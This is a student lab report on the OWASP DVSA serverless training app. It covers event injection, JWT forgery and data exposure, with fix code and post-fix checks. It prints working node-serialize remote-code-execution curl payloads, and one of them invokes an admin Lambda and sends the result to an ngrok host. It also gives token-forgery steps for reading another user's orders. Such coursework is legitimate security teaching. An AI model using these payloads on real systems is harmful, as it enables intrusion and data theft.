# ICS-344 DVSA Vulnerability Discovery and Remediation

Unified GitHub repository for the DVSA course project. Each lesson is stored in its own folder with a standalone README and extracted evidence images. Sensitive values such as JWTs, session tokens, and private identifiers are redacted or represented through local variables such as `$TOKEN`, `$JWT`, and `$API`.

# Project Overview

ICS-344 DVSA Vulnerability Discovery and Remediation

Unified Solution Report for Lessons 1-10

ICS-344 DVSA Vulnerability Discovery and Remediation

| Field | Value |
| --- | --- |
| Course / Section | ICS-344 Information Security / 03 |
| Student Name(s) + ID(s) | Hussain Albaggal |
| DVSA Website URL | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| AWS Region | us-east-1 (United States, N. Virginia) |
| Date | 4 May 2026 |
| Included Lessons | Lessons #1 through #10 |
| Evidence handling | Screenshots are cropped/redacted where needed to avoid exposing JWTs, session identifiers, or sensitive values. |
| Report structure | Each lesson follows the project template: goal, root cause, environment, reproduction, proof, mitigation, code/configuration changes, verification, structured analysis tables, and takeaway. |

Report Scope and Organization

This unified document consolidates the DVSA lesson write-ups into one consistent report format. The lessons are sorted from Lesson #1 to Lesson #10 and use consistent headings, figure captions, evidence tables, code/configuration blocks, verification sections, and the required structured analysis tables.

Security and privacy note: all testing described in this report was limited to the DVSA educational AWS environment. Tokens, session identifiers, and other sensitive values are redacted or represented through local variables such as $TOKEN, $JWT, and $API.

Quick Index of Included Vulnerabilities

| Lesson | Vulnerability | Primary Component | Main Proof | Main Fix |
| --- | --- | --- | --- | --- |
| 1 | Event Injection | API Gateway / DVSA-ORDER-MANAGER / node-serialize | CloudWatch FILE READ SUCCESS marker after crafted payload | Remove unsafe deserialization, use safe JSON parsing, validate actions |
| 2 | Broken Authentication | Cognito JWT / Authorization header | Tampered JWT allowed access to another user's data | Validate JWT signature and claims using Cognito verifier |
| 3 | Sensitive Data Exposure | S3 receipts bucket / API response | ngrok captured response containing S3 download URL and receipt file | Restrict S3 access and avoid exposing direct download URLs |
| 4 | Insecure Cloud Configuration | S3 feedback bucket / Lambda event processing | Malicious S3 object key printed ICS344_L4_SUCCESS in CloudWatch | Validate filenames, remove shell execution, harden S3 bucket policy |
| 5 | Broken Access Control | /dvsa/order, DVSA-ORDER-MANAGER, DynamoDB | Direct update changed DynamoDB itemList without payment/admin approval | Add backend authorization check for the update action |
| 6 | Denial of Service (DoS) | API Gateway / Lambda concurrency | Parallel requests caused 500 errors and instability | Apply API Gateway throttling and request rate control |
| 7 | Over-Privileged Function | IAM role / SAM template.yml | IAM Policy Simulator showed unnecessary S3/DynamoDB permissions | Restrict resources and replace CRUD with least-privilege permissions |
| 8 | Logic Vulnerability | Billing/update workflow and DynamoDB state | Billing and late update both succeeded against conflicting order states | Add atomic conditional writes and state-based update blocking |
| 9 | Vulnerable Dependencies | order-manager.js / node-serialize | CloudWatch marker confirmed dependency gadget execution | Remove unsafe unserialize and parse JSON safely with action allowlisting |
| 10 | Unhandled Exceptions | payment_processing.py | Malformed expiration value caused HTTP 502 and traceback | Validate request shape and handle malformed payment fields safely |


---

# Lesson #1: Event Injection

| Course / Term | ICS344: Information Security / Term 252 |
| --- | --- |
| Student Name(s) + ID(s) | Hussain Albaggal |
| DVSA Website URL | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| AWS Region | us-east-1 (United States, N. Virginia) |
| API Endpoint Used | https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order |
| Lambda Function | DVSA-ORDER-MANAGER |
| CloudWatch Log Group | /aws/lambda/DVSA-ORDER-MANAGER |

## Part 1) Goal and Vulnerability Summary

Lesson #1 demonstrates an Event Injection vulnerability that results in remote code execution through unsafe deserialization in the DVSA serverless backend. The affected workflow is the /dvsa/order API path, which is exposed through Amazon API Gateway and handled by the DVSA-ORDER-MANAGER AWS Lambda function. The security impact is severe because attacker-controlled request data can be interpreted as executable JavaScript inside the Lambda runtime instead of being handled only as plain JSON data. At a high level, the weakness is that the backend request-processing logic trusts and unserializes user-controlled input using a dangerous serialization library rather than safely parsing and validating JSON fields.

## Part 2) Why This Works / Root Cause

The vulnerability happens because the DVSA-ORDER-MANAGER Lambda function uses unsafe deserialization on data that comes directly from the API request. In the vulnerable code, the request body and headers are parsed using node-serialize / serialize.unserialize() instead of normal safe JSON parsing. This is risky because node-serialize supports special function markers such as _$$ND_FUNC$$_, which can turn part of the request into executable JavaScript code.

In the exploit, the request included an immediately invoked function inside the serialized value. When the backend tried to unserialize the request, the function executed before the rest of the handler completed. This means the application treated external user input as code instead of just data, which breaks a basic security rule for API handling.

That is why the payload was able to run inside the Lambda environment and print the FILE READ SUCCESS message in CloudWatch. Even though the API response later showed an internal server error, the important point is that the injected code had already executed during parsing. This confirms that the root cause is unsafe deserialization of attacker-controlled input.

![Lesson 1 evidence 1](evidence/lesson-01-evidence-01.png)

![Lesson 1 evidence 2](evidence/lesson-01-evidence-02.png)

![Lesson 1 evidence 3](evidence/lesson-01-evidence-03.png)

// Vulnerable pattern to screenshot before fixing const serialize = require('node-serialize');

var req = serialize.unserialize(event.body); var headers = serialize.unserialize(event.headers);

## Part 3) Environment and Setup

The test was done in the DVSA AWS lab environment for the ICS344 project, not on any real production system. For Lesson 1, the DVSA deployment was used was used in the us-east-1 region, which is United States, N. Virginia. The API base endpoint shown in the AWS application page was:

https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa

For the actual Lesson 1 test, The test used the /order route, so the full endpoint was:

https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order

The main affected backend component was the DVSA-ORDER-MANAGER Lambda function. This function receives the order API request and processes the request body before routing the action to other backend Lambda functions. The CloudWatch log group /aws/lambda/DVSA-ORDER-MANAGER was used to confirm whether the injected code executed.

The tools used in this lesson were the AWS Console, Lambda Console, API Gateway/Lambda application view, CloudWatch Logs, macOS Terminal, and curl. No real AWS keys, passwords, JWT tokens, session cookies, or private secrets are included in the report

![Lesson 1 evidence 4](evidence/lesson-01-evidence-04.png)

_Figure L1-1 shows the DVSA API endpoint deployed in us-east-1. The Lesson 1 /order path was added to this base endpoint when sending the test request._

## Part 4) Reproduction Steps

Open the AWS Console and confirm the selected region is United States (N. Virginia) / us-east-1.

Open the DVSA application resources and identify the API endpoint: https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa.

Append /order to create the Lesson 1 target endpoint: https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order.

Open a terminal and send a crafted POST request to the /dvsa/order API endpoint using curl.

Observe that the client receives HTTP 502 / Internal server error. This is expected in this lesson because the proof-of-concept request does not include a valid authorization header, and the application crashes after the injected code has already executed.

Open CloudWatch Logs and search the /aws/lambda/DVSA-ORDER-MANAGER log group for FILE READ SUCCESS.

Confirm that CloudWatch contains the injected log message, proving backend code execution.

Command used:

curl -i -s -X POST "https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order" \ -H 'Content-Type: application/json' \ -data-raw '{"action":"_$$ND_FUNC$$_function(){ var fs = require(\fs\); fs.writeFileSync(\/tmp/pwned.txt\, \You are reading the contents of my hacked file!\); var fileData = fs.readFileSync(\/tmp/pwned.txt\, \utf-8\); console.error(\FILE READ SUCCESS: \ + fileData); }()","cart-id":""}'

## Part 5) Evidence and Proof

The vulnerability is proven by combining the terminal output with the backend CloudWatch log. The terminal response showed HTTP 502 / Internal server error, but the CloudWatch log for DVSA-ORDER-MANAGER showed the injected FILE READ SUCCESS message. This means the malicious JavaScript executed inside the Lambda function before the backend failed later in the normal processing path.

![Lesson 1 evidence 5](evidence/lesson-01-evidence-05.png)

_Figure L1-2: Terminal output showing the crafted Event Injection payload sent to the /dvsa/order endpoint. The API returned HTTP 502 / Internal server error._

![Lesson 1 evidence 6](evidence/lesson-01-evidence-06.png)

_Figure L1-3: CloudWatch Logs showing FILE READ SUCCESS, proving that the injected JavaScript executed inside DVSA-ORDER-MANAGER._

Key proof line:

FILE READ SUCCESS: You are reading the contents of my hacked file!

## Part 6) Fix Strategy / Probable Mitigation

The fix belongs in the backend Lambda request-processing logic, specifically in DVSA-ORDER-MANAGER/order-manager.js. The mitigation is to remove unsafe deserialization from the request path, stop using node-serialize for attacker-controlled body or header data, parse request input with JSON.parse, reject serialized function markers, and validate request fields before any business logic runs. This addresses the root cause because the backend no longer gives user-controlled data a chance to become executable JavaScript. The fix should also avoid exposing detailed backend errors to the client; detailed diagnostic information should remain only in CloudWatch logs.

Remove the node-serialize import from order-manager.js.

Replace serialize.unserialize(event.body) with safe JSON parsing and validation.

Treat event.headers as a normal object or JSON object; do not unserialize it.

Reject payloads containing _$$ND_FUNC$$_ or $$ND_FUNC$$.

Validate that action is a string and is one of the expected order workflow actions.

Return a controlled 400 Bad request for malformed input and 401 Unauthorized when the authorization header is missing.

## Part 7) Code / Config Changes

Changed component:

Lambda function: DVSA-ORDER-MANAGER.

Source file path in the DVSA repository: backend/functions/order-manager/order-manager.js.

Removed logic: unsafe node-serialize request parsing.

Added logic: safe JSON parsing, serialized-function marker rejection, action validation, and safe error responses.

Before fix - vulnerable pattern:

const serialize = require('node-serialize');

var req = serialize.unserialize(event.body); var headers = serialize.unserialize(event.headers);

After fix - (recommended replacement code):

function makeResponse(statusCode, bodyObj) { return { statusCode: statusCode, headers: { "Access-Control-Allow-Origin": "*", "Content-Type": "application/json" }, body: JSON.stringify(bodyObj) }; }

function parseJsonObject(value, fieldName) { let parsed = value;

if (typeof value === "string") { parsed = JSON.parse(value); }

if (!parsed || Array.isArray(parsed) || typeof parsed !== "object") { throw new Error(fieldName + " must be a JSON object"); }

return parsed; }

function rejectSerializedFunctionMarkers(obj) { const raw = JSON.stringify(obj);

if (raw.includes("_$$ND_FUNC$$_") || raw.includes("$$ND_FUNC$$")) { throw new Error("Serialized function marker is not allowed"); } }

const ALLOWED_ACTIONS = new Set([ "new", "update", "cancel", "get", "orders", "account", "profile", "shipping", "billing", "complete", "inbox", "message", "delete", "upload", "feedback", "admin-orders" ]);

function validateRequest(req) { if (typeof req.action !== "string" || !ALLOWED_ACTIONS.has(req.action)) { throw new Error("Invalid action"); } }

var req; var headers;

try { req = parseJsonObject(event.body, "body"); headers = parseJsonObject(event.headers || {}, "headers");

rejectSerializedFunctionMarkers(req); rejectSerializedFunctionMarkers(headers); validateRequest(req); } catch (e) { console.warn("Rejected malformed request:", e.message); callback(null, makeResponse(400, { status: "err", message: "Bad request" })); return; }

var auth_header = headers.Authorization || headers.authorization;

if (!auth_header || typeof auth_header !== "string") { callback(null, makeResponse(401, { status: "err", message: "Unauthorized" })); return; }

## Part 8) Verification After Fix

After deploying the patched Lambda function, the same malicious curl request must be repeated. The expected secure result is that the request is rejected before any injected function executes. A good post-fix response is HTTP 400 with {"status":"err","message":"Bad request"}, or another controlled rejection that does not execute the payload. Then CloudWatch must be checked again to confirm that no new FILE READ SUCCESS line appears after the post-fix test timestamp.

After deploying the patched DVSA-ORDER-MANAGER Lambda function, the exact same malicious Event Injection payload was repeated. The request no longer returned HTTP 502. Instead, the backend safely rejected it with HTTP/2 400 and the response body: {"status":"err","message":"Bad request"}

This confirms that the malicious serialized-function payload was rejected before execution. CloudWatch Logs were then checked and confirmed that no new FILE READ SUCCESS entry appeared after the post-fix test timestamp. Old FILE READ SUCCESS entries from the pre-fix exploit may still remain in CloudWatch, but no new one was generated after the fix.

Post-fix verification command:

curl -i -s -X POST "https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order" \ -H 'Content-Type: application/json' \ -data-raw '{"action":"_$$ND_FUNC$$_function(){ var fs = require(\fs\); fs.writeFileSync(\/tmp/pwned.txt\, \You are reading the contents of my hacked file!\); var fileData = fs.readFileSync(\/tmp/pwned.txt\, \utf-8\); console.error(\FILE READ SUCCESS: \ + fileData); }()","cart-id":""}'

![Lesson 1 evidence 7](evidence/lesson-01-evidence-07.png)

![Lesson 1 evidence 8](evidence/lesson-01-evidence-08.png)

_Figure L1-4: CloudWatch post-fix logs for DVSA-ORDER-MANAGER. The malicious request was rejected after the fix, and no new FILE READ SUCCESS entry appeared after the post-fix timestamp._

![Lesson 1 evidence 9](evidence/lesson-01-evidence-09.png)

![Lesson 1 evidence 10](evidence/lesson-01-evidence-10.png)

![Lesson 1 evidence 11](evidence/lesson-01-evidence-11.png)

_Figure L1-5: Normal DVSA order/cart workflow still worked after the Lesson 1 fix, confirming that the mitigation did not break legitimate application behavior._

## Part 9) Structured Operation and Security Analysis

### 9.1 Intended Logic and Security Rule(s)

Under normal conditions, a user interacts with the DVSA frontend and submits an order-related request. The browser sends an HTTP request to Amazon API Gateway at the /dvsa/order endpoint. API Gateway invokes the DVSA-ORDER-MANAGER Lambda function. The Lambda function should parse the request as JSON data, read the Authorization header, validate the requested action, and route only legitimate order workflow operations to the correct backend function or data service. The correct output is an application response for the authenticated user, not execution of arbitrary code contained in request fields.

Rule 1: Request body and headers must be treated as untrusted data.

Rule 2: The backend must parse user input as data only, not as executable JavaScript.

Rule 3: The order manager must accept only expected action values and reject malformed requests.

Rule 4: A failed or unauthenticated request must fail safely without executing attacker-supplied code.

Rule 5: Detailed diagnostics belong in CloudWatch, while client-facing errors should remain generic.

### 9.2 Evidence Sources and Behavior Trace

| Case | Input / Action | Observed Behavior | Evidence |
| --- | --- | --- | --- |
| Normal intended behavior | Legitimate authenticated /dvsa/order request from the DVSA frontend. | Order manager parses JSON, validates the request, and routes the action without executing request fields as code. | Normal DVSA order/cart workflow still worked after the fix. The application continued to process legitimate order/cart requests without executing request fields as code. See Figure L1-5. |
| Exploit behavior | Crafted _$$ND_FUNC$$_function(){...}() payload sent to /dvsa/order with curl. | Injected JavaScript executed inside Lambda and wrote/read /tmp/pwned.txt before the API returned HTTP 502. | Terminal screenshot and CloudWatch FILE READ SUCCESS screenshot. |
| Post-fix behavior | Same crafted payload sent after replacing unsafe deserialization. | Request is rejected before execution; no new FILE READ SUCCESS entry appears in CloudWatch. | Post-fix curl output showed HTTP 400 Bad request, and CloudWatch showed no new FILE READ SUCCESS entry after the post-fix timestamp. See Figure L1-4. |

### 9.3 Deviation Analysis and Classification

The exploit is a security deviation because the action field in the API request was not handled as normal text/data. Instead, it was parsed in a way that allowed it to become executable JavaScript inside the Lambda function. The intended rule is that any value coming from the user, especially from an API request, must stay as data and must never be executed by the backend.

The proof is the CloudWatch log showing FILE READ SUCCESS. This message could not appear unless the injected function actually ran inside the DVSA-ORDER-MANAGER Lambda environment. So even though the API response showed an internal server error, the backend had already executed the malicious payload.

This case is classified as Intentional misuse / security-relevant abuse because the attacker deliberately sends a malformed node-serialize function payload using _$$ND_FUNC$$_ to trigger unauthorized code execution.

### 9.4 Explainable Fix and Post-Fix Validation

The wrong assumption was that data coming from the API request could be safely reconstructed using node-serialize. Since this data is controlled by the user, it should never be passed into a parser that can rebuild or execute functions. The fix should be applied inside the request-parsing logic of the DVSA-ORDER-MANAGER Lambda function.

To fix the issue, node-serialize was removed from the request path and the serialize.unserialize() calls were replaced with safe JSON parsing. Additional checks were added to reject serialized function markers such as _$$ND_FUNC$$_, validate that the action value is one of the expected actions, and return a clear controlled error when the request is invalid. This makes the backend treat the request as data only, not as code.

After the fix, the same malicious payload no longer created a new FILE READ SUCCESS entry in CloudWatch. At the same time, the normal DVSA order/cart workflow still worked. These two checks prove that the vulnerability was blocked without breaking legitimate application behavior.

## Table A - Structured Analysis Summary

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #1: Event Injection | Request body and headers must be parsed as data only. The backend must not execute user-controlled request fields, and only valid order workflow actions should be accepted. | DVSA API endpoint, DVSA-ORDER-MANAGER Lambda code, curl request, API response, CloudWatch Logs, and DVSA frontend order/cart workflow. | Normal DVSA order/cart workflow still worked after the fix, confirming that safe JSON parsing and marker rejection did not break legitimate behavior. See Figure L1-5. | The crafted _$$ND_FUNC$$_ payload returned HTTP 502 at the client but produced FILE READ SUCCESS in CloudWatch, proving backend JavaScript execution. |

## Table B - Structured Analysis Summary

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #1: Event Injection | The backend executed attacker-controlled request content during deserialization, violating the rule that external API input must be treated as data only. | Intentional misuse / security-relevant abuse | DVSA-ORDER-MANAGER/order-manager.js: removed node-serialize request parsing, used safe JSON parsing, rejected serialized function markers, validated action values, and returned controlled errors. | The same malicious payload returned HTTP 400 Bad request. CloudWatch showed no new FILE READ SUCCESS entry after the post-fix timestamp, and normal DVSA order/cart behavior still worked. | N/A |

## Part 10) Takeaway / Lessons Learned

This lesson shows that unsafe deserialization can turn a normal API request into backend code execution. In a serverless architecture, this is especially dangerous because injected code executes inside a managed Lambda environment that may have temporary file access, environment variables, CloudWatch logging, and AWS service permissions through the function execution role. The main secure design lesson is that user-controlled input must be treated as untrusted data, parsed using safe formats such as JSON, validated against strict expectations, and never passed into libraries or logic that can evaluate or reconstruct executable functions.

## Appendix A - Sources Used

ICS344 Project Description PDF: required 10-part structure, evidence, fix, verification, structured tables, and grading rules.

ICS344 Helper Guide PDF: Lesson 1 Event Injection reproduction flow, expected Internal server error behavior, and CloudWatch FILE READ SUCCESS proof.

OWASP DVSA project and official repository path: https://github.com/OWASP/DVSA.git

OWASP deserialization guidance: unsafe deserialization of untrusted data can lead to code execution and should be replaced with safe data parsing and validation.


---

# Lesson #2: Broken Authentication

| Lesson summary: The application failed to properly validate JWT tokens. By manipulating the token, an attacker could access resources belonging to other users, resulting in unauthorized access. |
| --- |

Main affected component: Cognito authentication, JWT validation logic, API Gateway/Lambda authorization

## Part 1) Goal and Vulnerability Summary

This vulnerability is Broken Authentication in the DVSA application. It affects the JWT authentication system used by the API Gateway and Lambda functions.

The system trusts the content of the JWT without properly verifying its integrity. As a result, an attacker can modify the token and impersonate another user.

The impact is serious because it allows unauthorized access to other users' data, such as viewing their orders.

## Part 2) Why This Works / Root Cause

The vulnerability exists because the backend does not properly verify the JWT signature.

Instead of validating the token cryptographically, the system simply decodes the token, reads the username field, and uses it directly without any verification.

This means: Any attacker can modify the payload and change the username.

## Part 3) Environment and Setup

The DVSA application is deployed on AWS using API Gateway and Lambda functions. The API endpoint used is https://3zb40wtoy7.execute-api.us-east-1.amazonaws.com/dvsa/order. The main Lambda function involved is DVSA-ORDER-MANAGER. The tools used in this experiment include browser developer tools, jwt.io, curl, jq, and AWS CloudWatch logs. Two accounts were used: an attacker (User B) and a victim (User C).

## Part 4) Reproduction Steps

1. Login as attacker.

2. Open Orders page.

3. Open DevTools ; Network tab.

4. Capture the request to dvsa/order.

5. Copy the Authorization token.

![Lesson 2 evidence 1](evidence/lesson-02-evidence-01.png)

_Figure L2-1: DevTools request showing captured attacker authorization token._

6. Go to jwt.io and paste attacker token.

7. Decode the payload.

![Lesson 2 evidence 2](evidence/lesson-02-evidence-02.png)

_Figure L2-2: Attacker JWT payload decoded in jwt.io._

8. Login as victim and repeat steps to get victim token.

9. Decode victim token and copy the username.

![Lesson 2 evidence 3](evidence/lesson-02-evidence-03.png)

_Figure L2-3: Victim authorization token captured from DevTools._

![Lesson 2 evidence 4](evidence/lesson-02-evidence-04.png)

_Figure L2-4: Victim JWT payload decoded in jwt.io._

10. Modify attacker token:

Replace attacker username with victim username

![Lesson 2 evidence 5](evidence/lesson-02-evidence-05.png)

_Figure L2-5: Terminal output showing victim username prepared for token forgery._

![Lesson 2 evidence 6](evidence/lesson-02-evidence-06.png)

_Figure L2-6: Python script used to forge a modified JWT token._

11. Generate new token (fake token).

12. Send request using curl:

curl -s "$API" \

-H "content-type: application/json" \

-H "authorization: $FAKE" \

-data-raw '{"action":"orders"}' | jq

![Lesson 2 evidence 7](evidence/lesson-02-evidence-07.png)

_Figure L2-7: Forged token request returning victim order data._

## Part 5) Evidence and Proof

The obtained response clearly demonstrates that the attacker was able to access data that does not belong to their account. After modifying the JWT payload and replacing the attacker's username with the victim's username, the system accepted the forged token and returned the victim's order information. This confirms that the backend relied solely on the decoded token content without verifying its authenticity. The presence of valid order entries associated with the victim account in the response serves as direct proof that the vulnerability can be successfully exploited to bypass authentication and gain unauthorized access.

## Part 6) Fix Strategy / Probable Mitigation

To mitigate this vulnerability, the authentication mechanism must be strengthened by ensuring that all incoming JWTs are properly verified before any user-related information is extracted. The system should validate the token's signature using the appropriate public keys provided by AWS Cognito, and it must also check critical claims such as issuer and expiration time. By performing full verification, the system can guarantee that the token has not been altered by an attacker. Any request containing an invalid or tampered token should be rejected immediately, preventing unauthorized access to protected resources.

## Part 7) Code / Config Changes

The fix is to properly verify JWT before using it.

Before:

var auth_data = jose.util.base64url.decode(token_sections[1]); var token = JSON.parse(auth_data); var user = token.username;

![Lesson 2 evidence 8](evidence/lesson-02-evidence-08.png)

_Figure L2-8: Before - Lambda code decodes JWT without signature verification._

After:

const verified = await verifyCognitoJwt(jwt); if (!verified) { throw new Error("Invalid token"); } var user = verified.username;

![Lesson 2 evidence 9](evidence/lesson-02-evidence-09.png)

_Figure L2-9: After - JWT verification is added before using token data._

![Lesson 2 evidence 10](evidence/lesson-02-evidence-10.png)

_Figure L2-10: After - invalid token handling is added in the backend._

## Part 8) Verification After Fix

Run same curl command again.

Now result:

{ "status": "err", "msg": "invalid token" }

![Lesson 2 evidence 11](evidence/lesson-02-evidence-11.png)

_Figure L2-11: After - attacker trying to get victim orders._

![Lesson 2 evidence 12](evidence/lesson-02-evidence-12.png)

_Figure L2-12: After - attacker getting his own orders._

This confirms that the system now correctly rejects forged tokens while allowing valid tokens to function as expected.

## Part 9) Structured Operation and Security Analysis

The following tables summarize the expected and exploited behaviors before and after applying the fix.

## Table A

| Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior | Exploit Behavior |
| --- | --- | --- | --- | --- |
| Broken Authentication | User must access only their data | JWT, API, curl | User sees own orders | Attacker sees victim orders |

## Table B

| Vulnerability | Deviation | Class | Fix Applied | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Broken Authentication | Token trusted without verification | Misuse | Add JWT verification | Attack fails | [Optional timing result] |

## Part 10) Takeaway / Lessons Learned

This vulnerability highlights the importance of not trusting client-controlled data without proper validation. Even though JWTs are commonly used for authentication, they are only secure when their signatures are verified correctly. Simply decoding the token and using its contents without verification exposes the system to serious risks such as identity spoofing and data leakage. In serverless architectures, security checks must always be enforced within backend services, as assumptions about token integrity can lead to critical security failures. Proper implementation of authentication mechanisms is essential to maintain system integrity and protect user data.


---

# Lesson #3: Sensitive Data Exposure

| Lesson summary: The system exposed sensitive information through API responses. An attacker could capture requests and obtain S3 download URLs, enabling access to receipt files without proper restrictions. |
| --- |

Main affected component: S3 receipts bucket, API response handling, Lambda output, data exposure via URLs

## Part 1) Goal and Vulnerability Summary

This lesson demonstrates a Sensitive Information Disclosure vulnerability in the DVSA application.

The issue exists in the backend Lambda function responsible for retrieving order receipts from Amazon S3. An attacker can exploit unsafe input handling and access privileged functionality to generate download URLs for sensitive receipt files.

The main affected component is the AWS Lambda function (DVSA-ORDER-MANAGER) interacting with S3. The impact is that unauthorized users can retrieve confidential receipt data without proper authorization.

The root weakness is improper handling of user input combined with missing authorization validation, allowing access to restricted resources.

## Part 2) Why This Works / Root Cause

The vulnerability is caused by unsafe deserialization using the node-serialize library.

User-controlled input is processed using serialize.unserialize(), which allows execution of injected code. This enables the attacker to invoke privileged backend functionality and extract sensitive data.

Additionally, the system lacks proper authorization checks before generating receipt download URLs.

## Part 3) Environment and Setup

The test was performed on the DVSA application deployed on AWS in the us-east-1 region.

The vulnerable component is the Lambda function:

DVSA-ORDER-MANAGER

Tools used:

- curl (for sending crafted requests)

- ngrok (for capturing exfiltrated data)

- AWS CloudWatch (for debugging errors)

- AWS Lambda Console (for code inspection and modification)

The API endpoint used:

https://3zb40wtoy7.execute-api.us-east-1.amazonaws.com/dvsa/order

## Part 4) Reproduction Steps

1. Start ngrok to capture outgoing requests:

./ngrok http 80

2. Export the DVSA API endpoint:

export API="https://3zb40wtoy7.execute-api.us-east-1.amazonaws.com/dvsa/order"

3. Send a malicious payload exploiting unsafe deserialization:

curl -s "$API" \

-H "content-type: application/json" \

-data-raw '{"action":"_$$ND_FUNC$$_function(){var aws=require(\aws-sdk\);var lambda=new aws.Lambda();var p={FunctionName:\DVSA-ADMIN-GET-RECEIPT\,InvocationType:\RequestResponse\,Payload:JSON.stringify({\year\:\2018\,\month\:\12\})};lambda.invoke(p,function(e,d){var h=require(\https\);h.get(\"https://agility-monetize-batting.ngrok-free.dev/ "+encodeURIComponent(JSON.stringify(d)));});}()"}'

4. Observe the response returned by the API.

5. Open the ngrok interface to capture the request:

http://127.0.0.1:4040

6. Extract the S3 download URL from the captured data.

7. Open the URL in the browser and download the receipt ZIP file.

## Part 5) Evidence and Proof

The vulnerability was successfully demonstrated.

1. The ngrok interface shows incoming requests containing sensitive data.

![Lesson 3 evidence 1](evidence/lesson-03-evidence-01.png)

_Figure L3-1: Exploit payload sent to the order API._

![Lesson 3 evidence 2](evidence/lesson-03-evidence-02.png)

_Figure L3-2: ngrok tunnel showing captured outgoing request data._

2. A download URL for S3 receipt files was generated.

![Lesson 3 evidence 3](evidence/lesson-03-evidence-03.png)

_Figure L3-3: ngrok request details showing generated S3 download URL._

3. The receipt file (ZIP) was successfully downloaded.

![Lesson 3 evidence 4](evidence/lesson-03-evidence-04.png)

_Figure L3-4: Receipt ZIP file successfully downloaded._

4. The ZIP file was opened to verify its contents. Although the folder was empty, the successful generation and access of the file confirms the vulnerability.

![Lesson 3 evidence 5](evidence/lesson-03-evidence-05.png)

_Figure L3-5: Downloaded receipt ZIP opened for verification._

## Part 6) Fix Strategy / Probable Mitigation

The vulnerability can be mitigated by eliminating unsafe deserialization and enforcing secure input handling.

The primary issue exists in the Lambda function (DVSA-ORDER-MANAGER), where user input is processed using an insecure library that allows execution of embedded code.

To fix this, the application should avoid using libraries such as node-serialize that support function execution. Instead, safe parsing methods such as JSON.parse should be used to ensure that input is treated strictly as data.

Additionally, proper authorization checks should be enforced before allowing access to sensitive operations such as receipt generation. Only authorized users should be able to request or generate download URLs for receipt files.

Applying these mitigations ensures that malicious payloads cannot execute code and prevents unauthorized access to sensitive S3 resources.

## Part 7) Code / Config Changes

The following changes were applied to fix the vulnerability:

1. Code Change:

The unsafe deserialization method:

serialize.unserialize(event.body)

![Lesson 3 evidence 6](evidence/lesson-03-evidence-06.png)

_Figure L3-6: Before - unsafe serialize.unserialize(event.body) usage._

was replaced with:

JSON.parse(event.body)

![Lesson 3 evidence 7](evidence/lesson-03-evidence-07.png)

_Figure L3-7: After - JSON.parse replaces unsafe deserialization._

This prevents execution of injected JavaScript code and ensures that input is handled as plain data.

2. Configuration Change:

A custom Lambda layer was created and attached to the function to include the missing dependency (aws-sdk).

![Lesson 3 evidence 8](evidence/lesson-03-evidence-08.png)

_Figure L3-8: After - custom Lambda layer attached for missing dependency._

This resolved the runtime error and allowed proper execution of the application during testing.

These changes ensure that the application no longer allows arbitrary code execution and functions securely.

## Part 8) Verification After Fix

After applying the fix, the same exploit was executed again using the identical malicious payload.

![Lesson 3 evidence 9](evidence/lesson-03-evidence-09.png)

_Figure L3-9: After - ngrok shows no exploit callback after the fix._

The request was sent through curl in the same way as before the fix. However, this time the behavior was different.

No outgoing requests were observed in the ngrok interface, which indicates that the injected code was not executed.

Instead of executing the malicious payload, the application treated the input as normal data. This confirms that the unsafe deserialization issue has been successfully resolved.

Additionally, normal application functionality was not affected by the fix, as valid requests continue to work correctly.

Therefore, the vulnerability is considered fully mitigated.

## Part 9) Structured Operation and Security Analysis

The following tables summarize the expected and exploited behaviors before and after applying the fix.

## Table A

| Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior | Exploit Behavior |
| --- | --- | --- | --- | --- |
| Sensitive Information Disclosure | User input must be treated as data only and must not be executed as code. | API, curl, ngrok, AWS Lambda, S3 | The application processes user requests safely and returns only authorized data. | The attacker injects malicious code using unsafe deserialization, executes arbitrary code, and retrieves a signed S3 URL containing sensitive receipt data. |

## Table B

| Vulnerability | Deviation | Class | Fix Applied | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Sensitive Information Disclosure | User input is executed as code instead of being treated as data. | Injection (Remote Code Execution) | Replaced serialize.unserialize() with JSON.parse() to prevent code execution. | The same exploit was executed again, and no request was received by ngrok, confirming that the attack failed. | Not measured |

## Part 10) Takeaway / Lessons Learned

This lesson demonstrated a critical security vulnerability caused by unsafe deserialization in a serverless application.

By exploiting the use of the node-serialize library, it was possible to inject and execute arbitrary JavaScript code within the backend Lambda function. This allowed unauthorized access to sensitive data stored in Amazon S3 through the generation of signed download URLs

The vulnerability was successfully mitigated by replacing unsafe deserialization with secure parsing using JSON.parse, ensuring that user input is treated strictly as data rather than executable code.

Verification after the fix confirmed that the exploit no longer works, and no malicious requests were executed. This demonstrates the effectiveness of the applied mitigation.

This lesson highlights the importance of secure input handling, avoiding unsafe libraries, and validating all user-controlled data in cloud-based applications.


---

# Lesson #4: Insecure Cloud Configuration

| Field | Value |
| --- | --- |
| Course / Term | ICS344: Information Security / Term 252 |
| Student Name(s) + ID(s) | Hussain Albaggal |
| DVSA Website URL | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| AWS Region | us-east-1 (United States, N. Virginia) |
| Lesson Title | Lesson #4: Insecure Cloud Configuration |
| Main AWS Services | Amazon S3, AWS Lambda, CloudWatch Logs, IAM, API Gateway |
| Primary Lambda Function | DVSA-FEEDBACK-UPLOADS |
| CloudWatch Log Group | /aws/lambda/DVSA-FEEDBACK-UPLOADS |
